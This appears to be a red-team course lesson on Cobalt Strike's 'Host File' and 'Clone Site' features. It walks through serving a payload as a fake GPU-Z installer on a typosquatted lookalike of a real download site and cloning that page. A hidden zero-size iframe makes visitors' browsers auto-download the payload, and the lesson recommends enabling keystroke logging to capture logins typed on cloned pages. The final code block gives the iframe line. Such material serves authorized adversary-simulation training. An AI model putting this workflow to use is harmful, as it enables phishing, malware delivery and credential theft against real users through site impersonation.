# Host File

The first thing to do is host the file to download on Cobalt Strike's internal web server, via **Site Management > Host File**.

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/88a2f45c0bcf772c9f6b3ed1fd821299.png" alt="" height="335" width="381"><figcaption></figcaption></figure>

Where:

* **File** is the original file to upload.  This is your initial access package (although I'm just using a raw executable payload in this example).
* **Local URI** is the URI that Cobalt Strike's web server will make this file available on.  I'm using `/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe`.
* **Local Host** sets the URL for the hosted file.  It default's to the team server's public IP address but we're using a lookalike domain instead.  This domain obviously needs to point to the public IP of the team server (or a redirector that can redirect the HTTP request to the team server).
* **Local Port** defines the port that the file will be hosted on.
* **Mime Type** sets the Content-Type that Cobalt Strike's built-in web server will serve the file as.  Leaving it set to automatic will let&#x20;

Once hosted, it will appear in the Sites manager (**Site Management > Manage**).

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/e3f0a6f143f2f84c9cb75df3dd7c69a4.png" alt="" height="260" width="1194"><figcaption></figcaption></figure>

Highlighting the row and clicking the **Copy URL** button will place a URL in your clipboard.  In this example it will be _http://www.bleepincomputer.com:80/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe_.

#### Clone Site <a href="#el_1742911678006_781" id="el_1742911678006_781"></a>

The next step is to create the site clone and embed the above file into it (**Management > Clone Site**).

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/69cb9662c4725f0261db4f63781b38bc.png" alt="" height="388" width="376"><figcaption></figcaption></figure>

Where:

* **Clone URL** is the exact page that we want to clone.  The page we're cloning is _https://www.bleepingcomputer.com/download/gpu-z/_.
* **Local URI** is the URI that the team server will host this cloned page on.  We generally want to match this with the URI of the page we're cloning.
* **Local Host** and **Port** is as above.&#x20;
* **Attack** is the resource you want to embed in the cloned page.  Use the **...** button to select any resource that is hosted on Cobalt Strike's team server.
* **Log keystrokes** will send any key presses on the cloned site to Cobalt Strike's web log.  This is useful if the cloned page has a login form for instance.

Once cloned, you will get another URL back, which is a concatination of the local host, local port, and local uri:  _http://www.bleepincomputer.com:80/download/gpu-z/_.

This is the URL to send to a user.  When visited, they will see the cloned GPU-Z page and the browser will automatically download our payload as _GPU-Z-2.22.0.exe_.

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/31c1fc1eb628de795e7b62967f322c30.png" alt="" width="100%"><figcaption></figcaption></figure>

This works by embedding a hidden iframe into the cloned page where the source is the URL of the hosted file:\


```html
<IFRAME SRC="http://www.bleepincomputer.com:80/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe?id=null" WIDTH="0" HEIGHT="0"></IFRAME>
```

\
